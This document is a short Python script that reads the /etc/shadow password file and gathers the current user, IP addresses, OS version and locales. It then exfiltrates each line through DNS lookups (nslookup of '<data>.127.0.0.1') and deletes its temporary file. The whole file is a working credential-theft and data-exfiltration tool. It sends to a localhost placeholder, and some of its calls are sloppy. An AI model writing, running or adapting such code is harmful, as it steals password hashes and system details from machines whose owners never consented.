import os


# take from the data the necessary lines - ip address
def ip(string: str):
    array = string.split(" ")
    outF = open("script.txt", "a")
    outF.write(array[0])
    outF.write("\n")
    outF.close()


# take from the data the necessary lines - languages
def lan(string: str):
    array = string.split(" ")
    outF = open("script.txt", "a")
    for word in array:
        outF.write(word)
        outF.write("\n")
    outF.close()


# take from the data the necessary lines - os
def ops(string: str):
    array = string.split(" ")
    outF = open("script.txt", "a")
    for word in array:
        outF.write(word)
        outF.write("\n")
    outF.close()


if __name__ == "__main__":

    # shadow file - password file
    os.chdir('/etc')

    if os.geteuid() != 0:
        print("Err. You are not root.")

    outF = open("script.txt", "a")
    # get the password file
    with open("shadow", "r") as f:
        print("*******************")
        print("PASSWORD FILE")
        print("*******************")
        sh_lines = f.readlines()
        print(sh_lines)
        print("\n")
        for line in sh_lines:
            line.replace(" ", "")
            outF.write(line)
            outF.write("\n")

    # other information we want:
    cmd = ['whoami', 'hostname -I', 'lsb_release -a', 'locale -a']  # user, ip, os information, language
    Title = ["Current User", "IP", "OS Version", "available languages"]
    i = 0
    for c in cmd:
        print("*******************")
        print(Title[i])
        print("*******************\n")
        os.popen(c, 'w')  # write to cmd
        i = i + 1
        data = os.popen(c).readlines()  # read from cmd
        for line in data:
            if c == "hostname -I":
                ip(line)
            if c == "locale -a":
                lan(line)
            if c == "lsb_release -a":
                ops(line)
            if c == "whoami":  # current user
                outF = open("script.txt", "a")
                outF.write(line)
                outF.write("\n")
                outF.close()

    outF = open("script.txt", "r")
    lines = outF.readlines()
    for line in lines:
        os.popen(f'nslookup {line}.127.0.0.1 +noidnin +noidnout', 'w')

    os.remove("script.txt")
